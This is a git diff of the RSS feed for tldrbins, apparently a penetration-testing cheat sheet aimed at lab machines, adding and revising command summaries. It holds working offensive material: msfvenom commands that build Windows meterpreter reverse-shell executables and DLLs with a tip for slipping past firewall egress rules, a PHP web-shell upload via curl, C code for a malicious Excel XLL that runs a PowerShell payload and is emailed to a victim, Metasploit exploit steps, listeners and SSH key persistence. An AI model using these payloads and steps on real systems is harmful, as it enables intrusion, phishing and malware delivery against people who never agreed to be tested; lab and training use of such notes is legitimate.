@@ -8,6 +8,13 @@
     <language>en-us</language>
     <atom:link href="https://tldrbins.github.io/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Advance curl</title>
+      <link>https://tldrbins.github.io/advance_curl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/advance_curl/</guid>
+      <description> Advance curl # PUT request with a file curl -X PUT http://example.com/test.txt -d @test.txt # Upload as binary (preserve newlines and control characters) curl -X PUT http://example.com/test.txt --data-binary @test.aspx # POST request with with form param `file` curl -X POST -F &amp;#34;file=@shell.php;type=application/php;filename=shell.php&amp;#34; &amp;#39;http://example.com/upload&amp;#39; </description>
+    </item>
+    <item>
       <title>Compressed Files</title>
       <link>https://tldrbins.github.io/compressed_files/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -29,6 +36,13 @@
       <description> Zone Transfer dig test.com axfr @10.10.11.10 Domain Discovery dig @10.10.11.10 test.com dig @10.10.11.10 -x 10.10.11.10 dig @10.10.11.10 +short test.com any dig @10.10.11.10 -t NS test.com dig @10.10.11.10 _gc.test.com </description>
     </item>
     <item>
+      <title>Drupal</title>
+      <link>https://tldrbins.github.io/drupal/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/drupal/</guid>
+      <description>droopescan Download droopescan&#xA;droopescan scan drupal -u http://10.10.11.10 Note: This can take a long time to run</description>
+    </item>
+    <item>
       <title>File Transfer (Linux To Linux)</title>
       <link>https://tldrbins.github.io/file_transfer_linux_to_linux/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -47,7 +61,7 @@
       <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
-      <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share Base64 Encoding (for small binary) # In target Windows [System.</description>
+      <description>SMB Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:user password # From target Windows to local Linux copy test.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\test.txt test.txt # Delete file del test.txt # Remove SMB share net use /d \\10.13.14.10\share # Older Windows (e.</description>
     </item>
     <item>
       <title>Flask Cookie</title>
@@ -75,7 +89,14 @@
       <link>https://tldrbins.github.io/listeners/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/listeners/</guid>
-      <description> nc rlwrap nc -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 #After getting a connection (local) back </description>
+      <description> nc rlwrap nc -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 #After getting a connection (local) pwncat$ back </description>
+    </item>
+    <item>
+      <title>Metasploit</title>
+      <link>https://tldrbins.github.io/metasploit/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/metasploit/</guid>
+      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # quit metasploit exit Search Exploit # For example: samba search samba # Choose by # or name use 15 use exploit/multi/samba/usermap_script # Show exploit settings optiions # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
     </item>
     <item>
       <title>Metasploit Listener</title>
@@ -89,7 +110,7 @@
       <link>https://tldrbins.github.io/metasploit_shellcode/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
-      <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note 1: These will be flagged by AV Note 2: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+      <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe # Stageless msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note: These will be flagged by AV Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
     </item>
     <item>
       <title>MongoDB General</title>
@@ -152,7 +173,14 @@
       <link>https://tldrbins.github.io/nmap/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/nmap/</guid>
-      <description>Nmap Port Scan TCP Scan target=10.10.11.10 nmap -p- --min-rate 10000 -oA ./nmap-alltcp $target ports=$(cat nmap-alltcp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sCV -oA ./nmap-tcpscripts $target UDP Scan (common ports) target=10.10.11.10 nmap -sU --min-rate 10000 -oA ./nmap-udp $target ports=$(cat nmap-udp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sU -sCV -oA ./nmap-udpscripts $target Scan with nmap scripts Update scripts DB nmap --script-updatedb Search scripts nmap --script-help ftp* Scan with scripts nmap --script=ftp-anon -sV -sC -p 21 10.</description>
+      <description>Nmap Port Scan TCP Scan target=10.10.11.10 nmap -p- --min-rate 10000 -oA ./nmap-alltcp $target ports=$(cat nmap-alltcp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sCV -oA ./nmap-tcpscripts $target UDP Scan (common ports) target=10.10.11.10 nmap -sU --min-rate 10000 -oA ./nmap-udp $target ports=$(cat nmap-udp.nmap| grep -Eo &amp;#34;^[0-9]+&amp;#34; | tr &amp;#39;\n&amp;#39; &amp;#39;,&amp;#39; | sed -r &amp;#39;s/,$//&amp;#39;) nmap -p $ports -sU -sCV -oA ./nmap-udpscripts $target Scan with nmap scripts Update scripts DB nmap --script-updatedb Search scripts nmap --script-help ftp* Scan with a script nmap --script=ftp-anon -sV -sC -p 21 10.</description>
+    </item>
+    <item>
+      <title>openvpn</title>
+      <link>https://tldrbins.github.io/openvpn/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/openvpn/</guid>
+      <description> Connect to vpn sudo openvpn my_vpn.ovpn </description>
     </item>
     <item>
       <title>Password Cracking</title>
@@ -169,6 +197,13 @@
       <description>Phishing with XLL (Excel) revshells.com&#xA;shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } Compile shell.c using Linux x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32 Send email with the malicious xll file swaks --to &amp;#34;victim@victim.</description>
     </item>
     <item>
+      <title>Searchsploit</title>
+      <link>https://tldrbins.github.io/searchsploit/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/searchsploit/</guid>
+      <description> searchsploit # Search service with specific version # For example: samba 3.0 searchsploit samba 3.0 # Read the exploit searchsploit -x unix/remote/16320.rb # Copy the exploit searchsploit -m unix/remote/16320.rb </description>
+    </item>
+    <item>
       <title>Share Mount</title>
       <link>https://tldrbins.github.io/share_mount/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -180,7 +215,7 @@
       <link>https://tldrbins.github.io/smb_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/smb_enum/</guid>
-      <description>SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 --no-banner smbmap -H 10.10.11.10 --no-banner -u null # List known share smbmap -H 10.10.11.10 --no-banner -r &amp;#39;share&amp;#39; smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * Login with password smbmap smbmap -H 10.10.11.10 -u username -p password # List known share smbmap -H 10.</description>
+      <description>SMB Share Enum Login without password smbmap smbmap -H 10.10.11.10 smbmap -H 10.10.11.10 -u null # List known share smbmap -H 10.10.11.10 -r &amp;#39;share&amp;#39; smbclient smbclient -N -L \\\\10.10.11.10\\ #After found an accessible share smbclient -N \\\\10.10.11.10\\share\\ #After connection #List all files in a share recurse ON ls #Download all files mask &amp;#34;&amp;#34; recurse ON prompt OFF mget * # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\10.</description>
     </item>
     <item>
       <title>SMB Server</title>
@@ -194,7 +229,21 @@
       <link>https://tldrbins.github.io/ssh/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ssh/</guid>
-      <description>Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo &amp;#39;&amp;lt;id_rsa.pub&amp;gt;&amp;#39; &amp;gt;&amp;gt; /home/user/.ssh/authorized_keys Connect to SSH with id_rsa ssh user@10.10.11.10 -i id_rsa Note: Always append a new line in id_rsa key&#xA;Connect to SSH with creds ssh user@10.10.11.10 # After first connection (i.e., after &amp;#39;yes&amp;#39; to fingerprint prompt) sshpass -p &amp;#39;password&amp;#39; ssh user@10.</description>
+      <description>Check SSH version openssh-server&#xA;Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo &amp;#39;&amp;lt;id_rsa.pub&amp;gt;&amp;#39; &amp;gt;&amp;gt; /home/user/.ssh/authorized_keys Connect to SSH with id_rsa ssh user@10.10.11.10 -i id_rsa # Fix: no matching host key type found. Their offer: ssh-rsa,ssh-dss ssh user@10.10.11.10 -i id_rsa -oHostKeyAlgorithms=+ssh-rsa Note: Always append a new line in id_rsa key</description>
+    </item>
+    <item>
+      <title>ssl</title>
+      <link>https://tldrbins.github.io/ssl/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ssl/</guid>
+      <description>sslscan # Scan target SSL version sslscan 10.10.11.10 Fix Old ssl Protocol Connection Problem # Edit /etc/ssl/openssl.cnf [system_default_sect] #MinProtocol = DEFAULT@SECLEVEL=2 MinProtocol = None #CipherString = DEFAULT@SECLEVEL=2 CipherString = None Note: Remember to revert the changes after job done</description>
+    </item>
+    <item>
+      <title>Steganography</title>
+      <link>https://tldrbins.github.io/steganography/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/steganography/</guid>
+      <description> exiftool exiftool test.jpg steg steghide # Always try with empty passphrase steghide extract -sf test.jpg </description>
     </item>
     <item>
       <title>Subdomain Enum</title>
@@ -215,7 +264,28 @@
       <link>https://tldrbins.github.io/web_directory_enum/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/web_directory_enum/</guid>
-      <description> Web Directory Enum feroxbuster Download feroxbuster&#xA;HTTP feroxbuster -u http://example.com/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt HTTPS feroxbuster -u https://example.com/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Specify Extension feroxbuster -u http://example.com/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx gobuster Download gobuster&#xA;gobuster dir -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x php </description>
+      <description> Web Directory Enum feroxbuster Download feroxbuster&#xA;HTTP feroxbuster -u http://example.com/ --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt HTTPS feroxbuster -u https://example.com/ -k --depth 1 --methods=GET,POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt Specify Extension feroxbuster -u http://example.com/ --methods=GET,POST --depth=1 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x html, asp, aspx gobuster Download gobuster&#xA;gobuster dir -u http://example.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 40 -x php wfuzz # Fuzzing IDOR wfuzz -z range,1-99 http://example.com/users/FUZZ </description>
+    </item>
+    <item>
+      <title>Webdav</title>
+      <link>https://tldrbins.github.io/webdav/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/webdav/</guid>
+      <description> davtest Download davtest&#xA;davtest -url http://10.10.11.10 curl # Rename a remote file curl -X MOVE -H &amp;#39;Destination:http://example.com/test.php&amp;#39; http://example.com/test.txt </description>
+    </item>
+    <item>
+      <title>Windows ACLs</title>
+      <link>https://tldrbins.github.io/windows_acls/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/windows_acls/</guid>
+      <description> Window ACLs (Access Control Lists) Check ACLs icacls &amp;#34;C:\Users\User&amp;#34; F (full access) M (modify access) RX (read and execute access) R (read-only access) W (write-only access) D (delete) RC (read control) WDAC (write DAC) WO (write owner) S (synchronize) AS (access system security) MA (maximum allowed) GR (generic read) GW (generic write) GE (generic execute) GA (generic all) RD (read data/list directory) WD (write data/add file) AD (append data/add subdirectory) REA (read extended attributes) WEA (write extended attributes) X (execute/traverse) DC (delete child) RA (read attributes) WA (write attributes) OI (object inherit) CI (container inherit) IO (inherit only) NP (do not propagate inherit) I (permission inherited from parent container) </description>
+    </item>
+    <item>
+      <title>Wordpress</title>
+      <link>https://tldrbins.github.io/wordpress/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/wordpress/</guid>
+      <description> wpscan Download wpscan&#xA;wpscan --url http://10.10.11.10 -e ap,t,tt,u # You will need an api token to scan vulns wpscan --url http://10.10.11.10 -e ap,t,tt,u --api-token API_KEY </description>
     </item>
   </channel>
 </rss>
